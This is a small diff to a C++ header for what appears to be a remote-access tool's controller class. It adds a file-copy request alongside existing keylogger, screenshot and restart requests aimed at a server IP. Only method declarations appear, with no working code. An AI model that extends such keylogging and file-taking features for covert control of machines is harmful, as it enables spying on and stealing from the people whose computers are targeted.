@@ -17,6 +17,7 @@ public:
     bool sendRestartRequest();
     bool sendKeyloggerRequest();
     bool sendScreenshotRequest();
+    bool sendFileCopyRequest(const std::string& sourceFileName, const std::string& destinationFileName);
 
 private:
     std::string serverIP;
